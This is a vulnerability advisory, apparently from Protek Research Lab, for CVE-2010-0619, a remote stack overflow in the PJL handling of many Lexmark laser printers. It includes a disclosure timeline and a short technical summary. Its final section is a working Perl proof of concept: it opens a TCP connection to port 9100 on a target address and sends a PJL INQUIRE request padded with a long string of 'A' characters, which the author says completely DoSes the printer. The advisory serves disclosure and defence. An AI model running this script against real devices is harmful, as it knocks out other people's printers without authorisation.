@@ -1,0 +1,110 @@
+#####################################################################################
+
+Application:   Lexmark Multiple Laser printer Remote Stack Overflow
+
+Platforms:   Lexmark Multiple Laser printer      
+
+Exploitation:   Remote Exploitable    
+
+CVE Number:   CVE-2010-0619
+
+Discover Date:   2010-01-06
+
+Author:   Francis Provencher (Protek Research Lab's)
+
+Website:   http://www.protekresearchlab.com    
+
+
+#####################################################################################
+
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) Products affected
+5) The Code
+
+
+#####################################################################################
+
+=================
+1) Introduction
+=================
+
+Lexmark specializes in printers and printer accessories. Its current range of products includes color and monochrome laser printers and inkjet printers, both of which may include scanners (including all-in-one devices with faxing and copying capabilities and photo printers), and dot matrix printers. Lexmark was one of the first companies to release wifi inkjet printers and the very first to release printers with a web-enabled touchscreen, coming in early September of 2009. They also offer a wide variety of laser printers with software solutions for more professional printing environments.
+
+(Wikipedia)
+#####################################################################################
+
+====================
+2) Report Timeline
+====================
+
+2010-01-06  Vendor Contacted
+2010-01-09  Vendor Response
+2010-01-09  Vendor request a PoC
+2010-01-10  PoC is sent to the vendor
+2010-01-12  Vendor confirme they received PoC
+2010-01-13  Vendor confirm the vulnerability 
+2010-03-22  Public release of this advisory
+
+
+#####################################################################################
+
+======================
+3) Technical details
+======================
+
+Multiple Lexmark Laser Printers contain remote buffer overflow vulnerabilities in their PJL processing
+functionality. These vulnerabilities could lead to remote code execution on the printer without authentication. Device freezes when a specialy PLJ request is sent to the daemon with an invalid argument on PJL INQUIRE command.
+
+#####################################################################################
+
+=====================
+4) Product affected
+=====================
+
+The list is too long, you can found information on the Lexmark web site;
+
+http://support.lexmark.com/alerts
+
+
+#####################################################################################
+
+=============
+5) The Code
+=============
+
+
+#!/usr/bin/perl -w
+# Found by Francis Provencher for Protek Research Lab's
+# {PRL} Lexmark Multiple Laser Printer Remote Buffer Overflow PoC
+#
+# This PoC will completly DoS the printer and all is services, Use it at your own risk.
+#
+
+use IO::Socket;
+if (@ARGV < 1){
+exit
+}
+$ip = $ARGV[0];
+#open the socket
+my $sock = new IO::Socket::INET (
+PeerAddr => $ip,
+PeerPort => '9100',
+Proto => 'tcp',
+);
+
+
+$sock or die "no socket :$!";
+send($sock, "\033%-12345X\@PJL INQUIRE AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",0);
+
+
+
+close $sock;
+
+
+
+
+#####################################################################################
+(PRL-2010-01)
+ 
